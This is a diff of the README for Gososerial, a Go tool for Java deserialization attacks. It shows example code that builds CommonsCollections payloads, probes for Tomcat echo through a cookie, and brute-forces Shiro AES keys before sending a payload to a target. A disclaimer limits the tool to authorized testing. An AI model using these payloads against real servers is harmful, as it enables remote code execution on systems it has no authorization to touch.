@@ -12,74 +12,73 @@
 
 - 支持K1和K2的TomcatEcho，HTTP头可自行取名
 
-## Introduce
-
-- Ysoserial is a well-known tool for Java deserialization security
-
-- No Java environment and no need to download ysoserial.jar file
-
-- Enter the command to directly obtain the payload, which is convenient for writing security tools
-
-- Support CommonsCollections1-7, K1-K4, CommonsBeanutils1 now
-
-- Support TomcatEcho K1-K2, and the HTTP header name can be edited
-
-## Example
-
-CommonsCollections1 Payload
-
-![](https://github.com/EmYiQing/Gososerial/blob/master/img/1.png)
-
-
-List of Supported
-
-![](https://github.com/EmYiQing/Gososerial/blob/master/img/2.png)
-
 ## Quick Start
+
+- download and import
 
 ```shell
 go get github.com/EmYiQing/Gososerial
 ```
 
+- example
+
 ```go
 package main
 
-import gososerial "github.com/EmYiQing/Gososerial"
+import (
+	"fmt"
+	gososerial "github.com/EmYiQing/Gososerial"
+)
 
-func main()  {
-	payload := gososerial.GetCC1("calc.exe")
-	......
-	sendPayload(payload)
-	......
+func main() {
+	var payload []byte
+	payload = gososerial.GetCC1("calc.exe")
+	fmt.Println(payload)
 }
 ```
 
-TomcatEcho
+- how to use tomcat echo
 
 ```go
-// Testecho: expr 10 '*' 10 -> expr 10 '*' 10
-// Testcmd: expr 10 '*' 10 -> 100
-payload := gososerial.GetCCK2TomcatEcho("Testecho", "Testcmd")
+package main
 
-req.Cookie = payload
-req.Header["Testecho"] = "gososerial"
-req.Method = "POST"
-resp := httputil.sendRequest(req)
+import (
+	gososerial "github.com/EmYiQing/Gososerial"
+	"..."
+)
 
-if resp.Header["Testecho"] == "gososerial" {
-	log.Info("find tomcat echo")
+func main() {
+	// Testecho: expr 10 '*' 10 -> Testecho: expr 10 '*' 10
+	// Testcmd: expr 10 '*' 10 -> Testcmd: 100
+	payload := gososerial.GetCCK2TomcatEcho("Testecho", "Testcmd")
+
+	req.Cookie = payload
+	req.Header["Testecho"] = "gososerial"
+	req.Method = "POST"
+	resp := httputil.sendRequest(req)
+
+	if resp.Header["Testecho"] == "gososerial" {
+		log.Info("find cck2 tomcat echo")
+	}
 }
 ```
 
-Example
+- shiro scan example
 
 ```go
+package main
+
+import (
+	gososerial "github.com/EmYiQing/Gososerial"
+	"..."
+)
+
 func main() {
 	// Shiro Scan Code
 	target := "http://shiro_ip/"
 	// Brust Shiro AES Key 
 	key := shiro.CheckShiroKey(target)
-	if key != "" {
+	if key != nil {
 		log.Info("find key: %s", key)
 	}
 	// Use CommonsCollections5 Payload
@@ -94,18 +93,30 @@ func main() {
 }
 ```
 
-## About
+## 命令行 (beta)
 
-参考了xray中p师傅的代码
+- CommonsCollections1
 
-**ysoserial**: https://github.com/frohoff/ysoserial
+![](https://github.com/EmYiQing/Gososerial/blob/master/img/1.png)
+
+- 支持列表
+
+![](https://github.com/EmYiQing/Gososerial/blob/master/img/2.png)
+
+## 感谢
+
+参考xray作者phith0n和koalr师傅的代码
 
 **xray**: https://github.com/chaitin/xray
 
 **phith0n**: https://github.com/phith0n
 
+**ysoserial**: https://github.com/frohoff/ysoserial
+
+**koalr**: https://github.com/zema1/ysoserial
+
 ## 免责申明
 
 未经授权许可使用Gososerial攻击目标是非法的
 
-本程序应仅用于授权的安全测试与研究目的。
+本程序应仅用于授权的安全测试与研究目的
